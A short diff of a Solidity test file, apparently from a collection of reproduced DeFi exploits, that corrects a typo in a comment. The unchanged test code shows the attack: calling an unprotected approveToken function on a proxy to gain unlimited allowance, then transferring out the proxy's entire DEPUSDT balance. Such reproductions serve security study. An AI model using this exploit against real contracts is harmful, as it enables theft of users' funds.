@@ -40,7 +40,7 @@ contract ContractTest is Test {
     }
 
     function testApprove() public {
-        // No access controll. Thanks to this, attacker obtained authorization to transfer funds
+        // No access control. Thanks to this, attacker obtained authorization to transfer funds
         ProxyDEPUSDT.approveToken(address(DEPUSDT), address(this), type(uint256).max);
 
         DEPUSDT.transferFrom(address(ProxyDEPUSDT), address(this), DEPUSDT.balanceOf(address(ProxyDEPUSDT)));
